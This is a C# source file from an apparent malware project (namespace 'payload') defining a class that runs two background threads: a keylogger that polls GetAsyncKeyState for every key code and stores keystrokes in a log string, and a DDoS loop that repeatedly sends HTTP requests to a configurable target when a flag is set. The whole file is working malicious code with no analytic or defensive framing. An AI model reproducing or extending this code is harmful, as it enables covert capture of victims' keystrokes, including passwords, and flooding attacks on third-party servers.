using System.Net.Http;
using System.Threading;
using System.Windows.Forms;

using static payload.Native;
using static payload.Globals;

namespace payload
{
    public class Threads
    {
        private readonly Thread ddosThread;
        private readonly Thread keyloggerThread;

        public Threads()
        {
            ddosThread = new Thread(() =>
            {
                HttpClient hc = new HttpClient();
                while (true)
                {
                    if (ddos) hc.GetAsync(toddos).GetAwaiter().GetResult();
                    Thread.Sleep(1000);
                }
            });

            keyloggerThread = new Thread(() =>
            {
                while (true)
                {
                    if (logkeys)
                    {
                        for (int i = 0; i < 255; i++)
                        {
                            int key = GetAsyncKeyState(i);
                            if (key == 1 || key == -32767)
                            {
                                keylog += (Keys)i + " ";
                            }
                        }
                    }
                    Thread.Sleep(1);
                }
            });
        }

        public void Start()
        {
            ddosThread.Start();
            keyloggerThread.Start();
        }
    }
}
